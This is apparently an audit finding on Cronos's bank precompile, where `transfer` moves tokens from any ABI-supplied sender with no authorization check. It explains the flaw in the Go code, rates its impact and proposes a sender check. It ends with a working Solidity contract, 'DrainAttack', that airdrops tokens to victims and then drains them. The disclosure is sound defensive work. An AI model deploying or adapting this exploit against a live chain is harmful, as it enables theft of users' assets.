### Title
Unauthorized Token Transfer via Bank Precompile `transfer` Method — (`File: x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` method of the `BankContract` precompile accepts an arbitrary `sender` address as an ABI argument and calls `bankKeeper.SendCoins(ctx, from, to, ...)` without verifying that the `sender` has authorized the transfer. Any EVM contract can invoke this precompile to drain `evm/<caller_contract_address>` tokens from any account that holds them, with no consent from the token holder.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` case unpacks three ABI arguments — `sender`, `recipient`, and `amount` — and constructs the transfer as follows:

```go
sender := args[0].(common.Address)   // fully attacker-controlled
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())  // evm/0x<calling_contract>
amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

The `denom` is correctly scoped to the calling contract (`EVMDenom(contract.Caller())`), but `from` is taken verbatim from the ABI input. There is **no check** that `sender == contract.Caller()`, and there is no allowance/approval mechanism. Any contract can therefore call `transfer(victimAddress, attackerAddress, amount)` and move `evm/<contract_address>` tokens out of the victim's account without the victim's consent.

Compare this with the `mint`/`burn` cases in the same file, where the affected address is the ABI-supplied `recipient`/`addr` but the authority is implicitly the calling contract (it mints/burns its own token). The `transfer` case breaks that invariant by letting the calling contract act on behalf of an arbitrary third-party holder. [2](#0-1) 

---

### Impact Explanation

`evm/<contract_address>` tokens are native Cosmos SDK bank tokens. They are the on-chain backing for CRC20/CRC21 tokens managed through the bank precompile. Any user who holds `evm/0xContractA` tokens — received as rewards, liquidity positions, or any other DeFi interaction — can have those tokens transferred to an arbitrary address by ContractA at any time, with no on-chain recourse.

This is an **unauthorized transfer of CRC20/CRC21 assets** (Critical impact under the allowed scope).

---

### Likelihood Explanation

The bank precompile at address `0x0000000000000000000000000000000000000064` is callable by any EVM contract with no access restriction. [3](#0-2) 

An attacker needs only to:
1. Deploy a contract.
2. Mint `evm/<contract_address>` tokens to victims (e.g., via a yield-farming or airdrop scheme).
3. Call `transfer(victim, attacker, balance)` on the bank precompile from the same contract.

No privileged keys, governance access, or leaked secrets are required.

---

### Recommendation

Add a check that the `sender` argument equals `contract.Caller()` before executing the transfer, mirroring the authority model already used by `mint`/`burn`:

```go
case TransferMethodName:
    // ...
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the calling contract")
    }
```

Alternatively, implement an ERC20-style allowance mechanism so that token holders can explicitly authorize a contract to transfer on their behalf.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract DrainAttack {
    IBankPrecompile constant BANK = IBankPrecompile(0x0000000000000000000000000000000000000064);

    // Step 1: lure victim into receiving tokens (e.g., airdrop)
    function airdrop(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
    }

    // Step 2: drain victim's evm/<this_contract_address> tokens at will
    function drain(address victim, address attacker, uint256 amount) external {
        BANK.transfer(victim, attacker, amount);
    }
}
```

After `airdrop(victim, 1e18)`, the victim holds `evm/0x<DrainAttack>` tokens. Calling `drain(victim, attacker, 1e18)` transfers all of them to the attacker. The victim has no way to prevent or reverse this. [1](#0-0)
